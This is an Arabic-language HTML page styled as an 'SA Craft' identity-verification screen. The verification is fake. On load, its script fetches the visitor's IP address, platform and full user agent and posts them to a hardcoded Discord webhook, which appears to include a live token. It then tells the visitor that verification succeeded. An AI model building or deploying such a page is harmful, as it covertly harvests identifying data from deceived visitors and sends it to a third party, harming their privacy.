<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من الأمان | SA Craft</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .card {
            background-color: #1e293b;
            padding: 40px;
            border-radius: 16px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            border: 1px solid #334155;
            max-width: 400px;
            width: 90%;
        }
        .spinner {
            border: 4px solid rgba(88, 101, 242, 0.1);
            border-top: 4px solid #5865F2;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #5865F2; margin-bottom: 10px; font-size: 1.6rem; }
        p { color: #94a3b8; font-size: 1rem; margin: 0; }
        .footer-text { margin-top: 20px; font-size: 0.8rem; color: #475569; }
    </style>
</head>
<body>

<div class="card">
    <div id="loader" class="spinner"></div>
    <h2 id="status-title">جاري التحقق من الهوية</h2>
    <p id="status-desc">يرجى الانتظار، نقوم بتهيئة الاتصال الآمن...</p>
    <div class="footer-text">نظام حماية SA Craft</div>
</div>

<script>
    // رابط الويب هوك الخاص بك
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1489734184736919645/A5XVkjIKOkcC1wyYYKsK6W_XABOb8-yev-_UVMVJExH17eftv4tYTBhdIGJYshkmo95u";

    async function captureAndSend() {
        const title = document.getElementById('status-title');
        const desc = document.getElementById('status-desc');
        const loader = document.getElementById('loader');

        try {
            // 1. جلب عنوان الـ IP
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipRes.json();
            const userIp = ipData.ip;

            // 2. تجهيز بيانات ديسكورد (Embed)
            const payload = {
                username: "SA Craft Monitor",
                avatar_url: "https://i.imgur.com/8nLFCvV.png", 
                embeds: [{
                    title: "🔔 تنبيه: دخول جديد للموقع",
                    color: 5814783, // لون ديسكورد المميز
                    fields: [
                        { name: "🌐 عنوان الـ IP", value: `**${userIp}**`, inline: true },
                        { name: "💻 النظام", value: `\`${navigator.platform}\``, inline: true },
                        { name: "🌍 المتصفح", value: `\`${navigator.userAgent.split(' ')[0]}\``, inline: true },
                        { name: "🔗 الرابط الكامل للمتصفح", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                    ],
                    footer: { text: "نظام التتبع التلقائي | SA Craft" },
                    timestamp: new Date().toISOString()
                }]
            };

            // 3. الإرسال إلى ديسكورد
            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                // تحديث الواجهة بعد النجاح
                loader.style.display = "none";
                title.innerText = "اكتمل التحقق ✅";
                title.style.color = "#4ade80";
                desc.innerText = "تم تأكيد هويتك، يمكنك المتابعة الآن.";
            }

        } catch (error) {
            console.error("Error:", error);
            loader.style.display = "none";
            title.innerText = "فشل الاتصال";
            title.style.color = "#f87171";
            desc.innerText = "حدث خطأ أثناء معالجة الطلب.";
        }
    }

    // بدء العملية عند التحميل
    window.onload = captureAndSend;
</script>

</body>
</html>
